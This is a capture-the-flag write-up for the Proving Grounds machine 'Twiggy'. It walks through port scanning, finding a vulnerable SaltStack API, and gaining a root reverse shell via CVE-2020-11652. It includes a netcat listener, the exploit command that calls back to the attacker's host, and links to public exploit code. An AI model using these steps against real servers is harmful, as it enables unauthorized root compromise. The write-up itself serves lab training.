---
layout: writeup
name: "Twiggy"
platform: "ProvingGrounds"
category: "pg"
difficulty: "Easy"
permalink: /writeups/pg/twiggy/
os: "OffSec Proving Grounds"
date: 2026-02-25
pwned: true
---
# CTF Writeup: Twiggy (Proving Grounds)

**Platform:** OffSec Proving Grounds\
**IP Address:** 192.168.55.62\
**Difficulty:** Easy

---

## 🌟 Overview

Twiggy is an OffSec Proving Grounds machine that exposes several services, including a SaltStack installation vulnerable to CVE-2020-11652. We enumerate open ports and versions, identify the Salt API, and gain root access through an unauthenticated RCE vulnerability.

---

## 🔍 Enumeration

### 🔎 Nmap

```bash
nmap -p- 192.168.55.62
```

```
Ports Found:
22/tcp   OpenSSH 7.4
53/tcp   NLnet Labs NSD
80/tcp   nginx 1.16.1 (Mezzanine CMS)
4505/tcp ZeroMQ ZMTP 2.0
4506/tcp ZeroMQ ZMTP 2.0
8000/tcp nginx 1.16.1 (Salt API JSON Response)
```

```bash
nmap -p 22,53,80,4505,4506,8000 -sCV 192.168.55.62
```

- Port 8000 returned JSON identifying the backend as `salt-api/3000-1`

### 🤖 Web & API Analysis

```bash
curl http://192.168.55.62:8000
```

Response:

```json
{"clients": ["local", ..., "wheel_async"], "return": "Welcome"}
```

**Header:** `X-Upstream: salt-api/3000-1`

---

## 🚀 Exploitation

### 🔍 Identify Vulnerability

SaltStack version 3000.1 is vulnerable to:

- **CVE-2020-11651** (Auth bypass)
- **CVE-2020-11652** (Directory traversal / RCE)

```bash
searchsploit saltstack
```

- Found Exploit: [https://www.exploit-db.com/exploits/48421](https://www.exploit-db.com/exploits/48421)
- PoC Used: [https://github.com/Al1ex/CVE-2020-11652](https://github.com/Al1ex/CVE-2020-11652)

### 🛠️ Setup Exploit

Initial error:

```bash
ModuleNotFoundError: No module named 'salt'
```

Fixed with:

```bash
python3 -m pip install salt --break-system-packages
```

Other required modules:

```bash
python3 -m pip install looseversion pyzmq --break-system-packages
```

### ⚔️ Exploit Execution

```bash
nc -lvnp 80
python3 CVE-2020-11652.py --master 192.168.55.62 --port 4506 -lh 192.168.49.55 -lp 80 --exec-choose master
```

Shell received as root:

```bash
[root@twiggy root]# cat proof.txt
2c62fdee43317a2c5a26738b03ece8d1

# Hash Verification
sha256sum proof.txt
b07fb99fafc4e996a9e63c09f07b06d7be25f112d7f85d1125f7deec4eb3d4a4
md5sum proof.txt
743ce2f8539730798b19448bba6f7318
```
---

## 💡 Lessons Learned

- SaltStack versions prior to 3000.2 are **dangerously exposed** if not firewalled.
- Proper dependency management in Kali often requires using `--break-system-packages` or `pipx`.
- Always verify the running version of services via HTTP headers or `/version` endpoints.
- PG boxes often reward direct exploitation of known CVEs.

---

## 🔒 Proof Screenshot
<img src="https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/pg_twiggy.png"/>


---

## 📊 Summary

- Salt API RCE via CVE-2020-11652
- Root access immediately due to unauthenticated nature
- Flag found at `/root/proof.txt`

"Writeup and proof included in GitHub repo: https://github.com/inkedqt/ctf-writeups/tree/main/Other/PG/Twiggy"